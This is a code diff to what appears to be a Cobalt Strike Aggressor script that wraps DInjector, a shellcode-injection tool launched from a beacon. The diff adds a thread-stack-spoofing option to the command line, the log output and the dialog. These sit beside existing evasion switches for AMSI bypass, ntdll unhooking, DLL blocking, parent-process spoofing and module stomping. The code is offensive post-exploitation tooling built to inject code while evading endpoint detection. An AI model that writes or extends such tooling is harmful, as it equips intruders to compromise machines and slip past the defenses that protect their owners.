@@ -69,6 +69,10 @@ sub dinject {
     $cmd .= " /am51:"        . %options["am51"];
     $cmd .= " /remoteAm51:"  . %options["remoteAm51"];
 
+    if (%options["spoofStack"] eq "true") {
+        $cmd .= " /spoofStack:True";
+    }
+
     if (%options["blockDlls"] eq "true") {
         $cmd .= " /blockDlls:True";
     }
@@ -87,9 +91,9 @@ sub dinject {
     blog($bid, "\c7Executed command\cF:\cD execute-assembly DInjector.exe "
          . %options["technique"] . " /sc:<BASE64>" . " /p:$pass" . " /protect:" . %options["protect"]
          . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /fluctuate:" . %options["fluctuate"]
-         . " /image:" . %options["image"] . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
-         . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
-         . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . "/remoteAm51:" . %options["remoteAm51"]
+         . " /spoofStack:" . %options["spoofStack"] . " /image:" . %options["image"] . " /pid:" . %options["pid"]
+         . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"] . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"]
+         . " /sleep:" . %options["sleep"] . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . "/remoteAm51:" . %options["remoteAm51"]
          . " /unhook:" . %options["unhook"] . " /debug:" . %options["debug"]);
 }
 
@@ -125,6 +129,7 @@ popup beacon_bottom {
         %options["timeout"]     = "0";
         %options["flipSleep"]   = "0";
         %options["fluctuate"]   = "0";
+        %options["spoofStack"]  = "false";
         %options["image"]       = "C:\\Windows\\System32\\svchost.exe";
         %options["pid"]         = "0";
         %options["ppid"]        = "0";
@@ -185,9 +190,10 @@ popup beacon_bottom {
                                                                                "True",
                                                                                "Force"));
 
-        drow_checkbox($dialog, "blockDlls", "[/blockDlls] DLLs:", "Block 3rd-party DLLs");
-        drow_checkbox($dialog, "unhook",    "[/unhook] Unhook:",  "Unhook ntdll.dll");
-        drow_checkbox($dialog, "debug",     "[/debug] Debug:",  "Print debug messages");
+        drow_checkbox($dialog, "spoofStack", "[/spoofStack] Stack:", "Spoof thread stack");
+        drow_checkbox($dialog, "blockDlls",  "[/blockDlls] DLLs:",   "Block 3rd-party DLLs");
+        drow_checkbox($dialog, "unhook",     "[/unhook] Unhook:",    "Unhook ntdll.dll");
+        drow_checkbox($dialog, "debug",      "[/debug] Debug:",      "Print debug messages");
 
         dbutton_action($dialog, "Inject");
 
